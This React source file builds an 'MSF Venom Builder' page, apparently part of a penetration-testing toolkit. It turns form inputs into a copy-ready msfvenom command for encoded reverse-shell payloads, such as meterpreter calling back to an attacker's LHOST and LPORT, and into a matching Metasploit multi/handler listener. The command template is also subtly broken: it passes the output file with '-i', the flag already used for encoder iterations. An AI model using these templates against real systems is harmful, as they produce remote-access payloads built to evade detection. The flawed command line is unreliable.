import React from 'react';
import { Input, Typography, Row, Divider, Select, Form, Col, Collapse } from 'antd';
import PersistedState from 'use-persisted-state';
import Clipboard from 'react-clipboard.js';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph } = Typography;

const MSFBuilder = () => {
	// LocalStorage stuff
	const msfVenomBuilder = PersistedState('msfVenomBuilder');

	// Antd stuff
	const { Option } = Select;
	const { Panel } = Collapse;

	let payloads = require('../../assets/data/Payloads.json');
	let encoder = require('../../assets/data/Encoder.json');
	let platform = require('../../assets/data/Platform.json');
	let format = require('../../assets/data/Format.json');

	const [ values, setValues ] = msfVenomBuilder({
		Payload: '',
		LHOST: '',
		LPORT: '',
		Encoder: '',
		EncoderIterations: '',
		Platform: '',
		Arch: '',
		NOP: '',
		BadCharacters: '',
		Format: '',
		Outfile: ''
	});

	const handleChange = (name) => (event) => {
		setValues({ ...values, [name]: event.target.value });
	};

	const handleChangeSelect = (prop) => (data) => {
		setValues({ ...values, [prop]: data });
	};

	return (
		<QueueAnim delay={300} duration={1500}>
			<div style={{ margin: 15 }}>
				<Title variant='Title level={3}' style={{ fontWeight: 'bold' }}>
					MSF Venom Builder
				</Title>
				<Paragraph>
					Msfvenom is a command line instance of Metasploit that is used to generate and output all of the
					various types of shell code that are available in Metasploit.
				</Paragraph>
			</div>
			<Divider dashed />
			<div
				key='a'
				style={{
					marginTop: 15,
					marginLeft: 15
				}}
			>
				<Form>
					<Form.Item
						name='payload'
						valuePropName={values.Payload}
						label='Payload'
						rules={[ { message: 'Missing area' } ]}
					>
						<Select
							showSearch
							options={payloads}
							value={values.Payload}
							onChange={handleChangeSelect('Payload')}
							placeholder='python/meterpreter/reverse_http'
							filterOption={(inputValue, option) =>
								option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
						>
							{payloads.map((data, key) => {
								return <Option key={key}>{data.value}</Option>;
							})}
						</Select>
					</Form.Item>
					<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
						<Col span={12}>
							<Form.Item
								name='ip_address'
								valuePropName={values.LHOST}
								label='LHOST'
								rules={[ { message: 'Missing area' } ]}
							>
								<Input
									value={values.LHOST}
									onChange={handleChange('LHOST')}
									maxLength={15}
									placeholder='IP Address or domain (ex: 212.212.111.222)'
								/>
							</Form.Item>
						</Col>
						<Col span={12}>
							<Form.Item
								name='port'
								valuePropName={values.LPORT}
								label='LPORT'
								rules={[ { message: 'Missing area' } ]}
							>
								<Input
									value={values.LPORT}
									onChange={handleChange('LPORT')}
									maxLength={5}
									placeholder='Port (ex: 1337)'
								/>
							</Form.Item>
						</Col>
					</Row>
					<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
						<Col span={12}>
							<Form.Item
								name='encoder'
								valuePropName={values.Encoder}
								label='Encoder'
								rules={[ { message: 'Missing area' } ]}
							>
								<Select
									showSearch
									options={encoder}
									value={values.Encoder}
									onChange={handleChangeSelect('Encoder')}
									placeholder='x86/shikata_ga_nai'
									filterOption={(inputValue, option) =>
										option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
								>
									{encoder.map((data, key) => {
										return <Option key={key}>{data.value}</Option>;
									})}
								</Select>
							</Form.Item>
						</Col>
						<Col span={12}>
							<Form.Item
								name='iteration'
								valuePropName={values.EncoderIterations}
								label='Iterations'
								rules={[ { message: 'Missing area' } ]}
							>
								<Input
									value={values.EncoderIterations}
									onChange={handleChange('EncoderIterations')}
									placeholder='4'
								/>
							</Form.Item>
						</Col>
					</Row>
					<Form.Item
						name='badchar'
						valuePropName={values.BadCharacters}
						label='Bad Characters'
						rules={[ { message: 'Missing area' } ]}
					>
						<Input
							value={values.BadCharacters}
							onChange={handleChange('BadCharacters')}
							placeholder='\x00\x0a\x0d'
						/>
					</Form.Item>
				</Form>
				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
					<Col span={12}>
						<Form.Item
							valuePropName={values.Platform}
							name='platform'
							label='Platform'
							rules={[ { message: 'Missing area' } ]}
						>
							<Select
								showSearch
								options={platform}
								value={values.Platform}
								onChange={handleChangeSelect('Platform')}
								placeholder='Windows'
								filterOption={(inputValue, option) =>
									option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
							>
								{platform.map((data, key) => {
									return <Option key={key}>{data.value}</Option>;
								})}
							</Select>
						</Form.Item>
					</Col>
					<Col span={12}>
						<Form.Item
							valuePropName={values.Arch}
							name='architecture'
							label='Architecture'
							rules={[ { message: 'Missing area' } ]}
						>
							<Select
								showSearch
								value={values.Arch}
								onChange={handleChangeSelect('Arch')}
								placeholder='x86'
							>
								<Option key={'x64'}>x64</Option>
								<Option key={'x86'}>x86</Option>
							</Select>
						</Form.Item>
					</Col>
				</Row>
				<Form.Item
					name='nop'
					valuePropName={values.NOP}
					label='Nop&#39;s'
					rules={[ { message: 'Missing area' } ]}
				>
					<Input value={values.NOP} onChange={handleChange('NOP')} maxLength={5} placeholder='200' />
				</Form.Item>
				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
					<Col span={12}>
						<Form.Item
							valuePropName={values.Format}
							name='format'
							label='Format'
							rules={[ { message: 'Missing area' } ]}
						>
							<Select
								showSearch
								options={format}
								value={values.Format}
								onChange={handleChangeSelect('Format')}
								placeholder='powershell'
								filterOption={(inputValue, option) =>
									option.value.toUpperCase().indexOf(inputValue.toUpperCase()) !== -1}
							>
								{format.map((data, key) => {
									return <Option key={key}>{data.value}</Option>;
								})}
							</Select>
						</Form.Item>
					</Col>
					<Col span={12}>
						<Form.Item
							valuePropName={values.Outfile}
							name='outfile'
							label='Output File'
							rules={[ { message: 'Missing area' } ]}
						>
							<Input
								value={values.Outfile}
								onChange={handleChange('Outfile')}
								placeholder='reverse_shell'
							/>
						</Form.Item>
					</Col>
				</Row>
				<Collapse defaultActiveKey={[ '1' ]} ghost>
					<Panel header='MSF Venom Command' key='1'>
						<Paragraph>
							<pre>
								{`msfvenom -p ${values.Payload} LHOST=${values.LHOST} LPORT=${values.LPORT} --platform ${values.Platform} -a ${values.Arch} -n ${values.NOP} -e ${values.Encoder} -i ${values.EncoderIterations} -b "${values.BadCharacters}" -f ${values.Format} -i ${values.Outfile}`}
							</pre>
						</Paragraph>
					</Panel>
					<Panel header='Launch Console & Load Handler' key='2'>
						<Paragraph>
							<pre>
								{`msfconsole -x "use exploit/multi/handler; set PAYLOAD ${values.Payload}; set LHOST ${values.LHOST}; set LPORT ${values.LPORT}; run"`}
							</pre>
						</Paragraph>
					</Panel>
					<Panel header='Load Handler Only' key='3'>
						<Paragraph>
							<pre>
								{`use exploit/multi/handler
set PAYLOAD ${values.Payload}
set LHOST ${values.LHOST}
set LPORT ${values.LPORT}
run`}
							</pre>
						</Paragraph>
					</Panel>
				</Collapse>
			</div>
		</QueueAnim>
	);
};

export default MSFBuilder;
